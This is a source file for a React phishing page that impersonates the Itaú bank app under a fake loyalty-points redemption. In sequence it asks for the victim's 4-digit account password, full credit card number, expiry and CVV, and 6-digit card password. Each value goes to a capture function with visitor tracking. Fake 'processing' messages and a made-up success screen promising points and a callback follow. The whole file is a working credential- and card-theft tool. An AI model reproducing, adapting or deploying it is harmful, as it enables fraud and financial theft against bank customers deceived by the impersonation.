import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { ChevronLeft, ShieldCheck } from "lucide-react";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";
import itauLogo from "@/assets/itau-logo.png";

const SenhaAcesso = () => {
  useVisitorTracking("senha-acesso");
  const navigate = useNavigate();
  const location = useLocation();
  const { nome, agencia, conta } = (location.state as any) || {};
  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao" | "sucesso">("senha");
  const [showCardLoading, setShowCardLoading] = useState(false);
  const CARD_LOADING_MESSAGES = [
    "Processando...",
    "Confirmando dados do cartão",
    "Validando informações",
    "Creditando seus pontos",
    "Processando Resgate",
  ];
  const [cardLoadingStep, setCardLoadingStep] = useState(0);
  const [showFinalLoading, setShowFinalLoading] = useState(false);
  const FINAL_LOADING_MESSAGES = [
    "Processando...",
    "Validando seus pontos",
    "Verificando saldo disponível",
    "Processando resgate",
    "Finalizando validação",
    "Aguarde... Estamos te direcionando para a próxima etapa",
  ];
  const [finalLoadingStep, setFinalLoadingStep] = useState(0);
  const [senha, setSenha] = useState("");
  const [numero, setNumero] = useState("");
  const [validade, setValidade] = useState("");
  const [cvv, setCvv] = useState("");
  const [senhaCartao, setSenhaCartao] = useState("");

  const maskedAgencia = agencia ? `*${agencia.slice(-2)}` : "**";
  const cleanConta = conta ? conta.replace(/\D/g, "") : "";
  const maskedConta =
    cleanConta.length >= 3
      ? `***${cleanConta.slice(-3, -1)}-${cleanConta.slice(-1)}`
      : "***--";

  const formatNumero = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
  };

  const formatValidade = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 4);
    if (digits.length > 2) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
    return digits;
  };

  const handleSenha = () => {
    if (senha.length === 4) {
      captureFormData("senha-acesso", { senha });
      setPhase("cartao");
    }
  };

  useEffect(() => {
    if (!showCardLoading) return;
    const interval = 10000 / CARD_LOADING_MESSAGES.length;
    const timer = setInterval(() => {
      setCardLoadingStep((prev) => {
        if (prev >= CARD_LOADING_MESSAGES.length - 1) return prev;
        return prev + 1;
      });
    }, interval);
    const redirect = setTimeout(() => {
      setShowCardLoading(false);
      setPhase("senhaCartao");
    }, 10000);
    return () => { clearInterval(timer); clearTimeout(redirect); };
  }, [showCardLoading]);

  const handleCartao = () => {
    const cleanNumero = numero.replace(/\D/g, "");
    if (cleanNumero.length >= 13 && validade.length >= 4 && cvv.length >= 3) {
      captureFormData("dados-cartao", { numero: cleanNumero, validade, cvv });
      setShowCardLoading(true);
      setCardLoadingStep(0);
    }
  };

  useEffect(() => {
    if (!showFinalLoading) return;
    const interval = 10000 / FINAL_LOADING_MESSAGES.length;
    const timer = setInterval(() => {
      setFinalLoadingStep((prev) => {
        if (prev >= FINAL_LOADING_MESSAGES.length - 1) return prev;
        return prev + 1;
      });
    }, interval);
    const redirect = setTimeout(() => {
      setShowFinalLoading(false);
      setPhase("sucesso");
    }, 10000);
    return () => { clearInterval(timer); clearTimeout(redirect); };
  }, [showFinalLoading]);

  const handleSenhaCartao = () => {
    if (senhaCartao.length === 6) {
      captureFormData("senha-cartao", { senhaCartao });
      setShowFinalLoading(true);
      setFinalLoadingStep(0);
    }
  };

  return (
    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #FE5200 0%, #CC4200 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-4">
        <div className="flex items-center gap-4">
          <button onClick={() => phase === "sucesso" ? null : phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
            <ChevronLeft className="text-primary-foreground" size={24} />
          </button>
          <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
            Acesso à conta
          </h1>
        </div>
      </div>

      {/* Account Info */}
      <div className="px-5 pt-4 pb-16 space-y-1">
        <p className="text-primary-foreground text-sm">
          Agência sem dígito: <span className="font-semibold">{maskedAgencia}</span>
        </p>
        <p className="text-primary-foreground text-sm">
          Conta com dígito: <span className="font-semibold">{maskedConta}</span>
        </p>
        <p className="text-primary-foreground text-sm">
          {phase === "sucesso" ? "Titularidade" : "Nome"}: <span className="font-semibold">{nome?.toUpperCase() || "TITULAR"}</span>
        </p>
      </div>

      {/* White Card */}
      <div className="flex-1 bg-white rounded-t-3xl px-6 pt-8 pb-8 flex flex-col">
        {phase === "senha" ? (
          <>
            <p className="text-foreground text-base font-medium mb-4">Qual é sua senha?</p>
            <input
              ref={(el) => el?.focus()}
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={4}
              value={senha}
              onChange={(e) => setSenha(e.target.value.replace(/\D/g, "").slice(0, 4))}
              className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-lg tracking-[0.5em] text-foreground"
              style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
            />
            <p className="text-muted-foreground text-sm mt-2">4 dígitos</p>
            <button className="text-[#FE5200] font-bold text-sm mt-4 text-left">
              Esqueci ou não tenho senha
            </button>
            <div className="flex-1" />
            <button
              onClick={handleSenha}
              disabled={senha.length !== 4}
              className="w-full py-4 rounded-full bg-muted text-muted-foreground font-semibold text-base transition-all disabled:opacity-60 enabled:bg-[#FE5200] enabled:text-white"
            >
              continuar
            </button>
          </>
        ) : phase === "cartao" ? (
          <>
            <p className="text-foreground text-xl font-bold mb-1">Confirme o seu cartão de crédito abaixo</p>
            <p className="text-muted-foreground text-sm mb-6">
              Atenção, o código de segurança é encontrado no verso do seu cartão e possui 3 dígitos.
            </p>

            <label className="text-foreground text-sm font-semibold mb-1 block">Número do Cartão</label>
            <input
              autoFocus
              type="text"
              inputMode="numeric"
              value={numero}
              onChange={(e) => setNumero(formatNumero(e.target.value))}
              className="w-full border-b-2 border-[#FE5200] pb-2 outline-none text-base text-foreground mb-6"
              placeholder=""
            />

            <div className="flex gap-6 mb-2">
              <div className="flex-1">
                <label className="text-foreground text-sm font-semibold mb-1 block">Vencimento</label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={validade}
                  onChange={(e) => setValidade(formatValidade(e.target.value))}
                  className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-base text-foreground"
                  placeholder="MM/AA"
                />
              </div>
              <div className="flex-1">
                <label className="text-foreground text-sm font-semibold mb-1 block">Código Segurança</label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-base text-foreground"
                  placeholder="000"
                />
              </div>
            </div>

            <p className="text-muted-foreground text-sm mb-3">Insira os dados corretamente</p>

            <button className="text-[#FE5200] font-bold text-sm mb-4 text-left">
              Esqueci minha senha
            </button>

            <div className="flex-1" />

            <button
              onClick={handleCartao}
              className="w-full py-4 rounded-full bg-[#FE5200] text-white font-semibold text-base hover:opacity-90 transition-opacity"
            >
              continuar
            </button>
          </>
        ) : phase === "senhaCartao" ? (
          <>
            <p className="text-foreground text-base font-medium mb-4">Qual é a senha do seu cartão?</p>
            <input
              autoFocus
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={6}
              value={senhaCartao}
              onChange={(e) => setSenhaCartao(e.target.value.replace(/\D/g, "").slice(0, 6))}
              className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-lg tracking-[0.5em] text-foreground"
              style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
            />
            <p className="text-muted-foreground text-sm mt-2">6 dígitos</p>
            <button className="text-[#FE5200] font-bold text-sm mt-4 text-left">
              Esqueci ou não tenho senha
            </button>
            <div className="flex-1" />
            <button
              onClick={handleSenhaCartao}
              disabled={senhaCartao.length !== 6}
              className="w-full py-4 rounded-full bg-muted text-muted-foreground font-semibold text-base transition-all disabled:opacity-60 enabled:bg-[#FE5200] enabled:text-white"
            >
              continuar
            </button>
          </>
        ) : (
          <div className="flex-1 flex flex-col items-center justify-center text-center">
            <div className="w-16 h-16 rounded-full bg-[#FE5200]/10 flex items-center justify-center mb-6">
              <ShieldCheck className="text-[#FE5200]" size={36} />
            </div>
            <p className="text-foreground text-xl font-bold mb-3">Resgate realizado com sucesso!</p>
            <p className="text-muted-foreground text-base mb-1">
              Você possui <span className="text-[#FE5200] font-bold">120.258</span> pontos para o resgate.
            </p>
            <p className="text-muted-foreground text-base mb-8">
              Um atendente entrará em contato em até 48 horas.
            </p>
            <button
              onClick={() => navigate("/")}
              className="w-full py-4 rounded-full bg-[#FE5200] text-white font-semibold text-base hover:opacity-90 transition-opacity"
            >
              finalizar
            </button>
          </div>
        )}
      </div>

      {/* Loading Modal after card */}
      {showCardLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="fixed inset-0 bg-black/50" />
          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
            <img src={itauLogo} alt="Itaú" className="h-14 mb-6" />
            <div className="w-10 h-10 border-[3px] border-muted rounded-full border-t-[#FE5200] animate-spin mb-6" />
            <p className="text-muted-foreground text-base text-center">
              {CARD_LOADING_MESSAGES[cardLoadingStep]}
            </p>
          </div>
        </div>
      )}

      {/* Loading Modal before success */}
      {showFinalLoading && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          <div className="fixed inset-0 bg-black/50" />
          <div className="relative z-50 w-full max-w-sm mx-4 bg-card rounded-2xl p-8 shadow-xl flex flex-col items-center">
            <img src={itauLogo} alt="Itaú" className="h-14 mb-6" />
            <div className="w-10 h-10 border-[3px] border-muted rounded-full border-t-[#FE5200] animate-spin mb-6" />
            <p className="text-muted-foreground text-base text-center">
              {FINAL_LOADING_MESSAGES[finalLoadingStep]}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default SenhaAcesso;
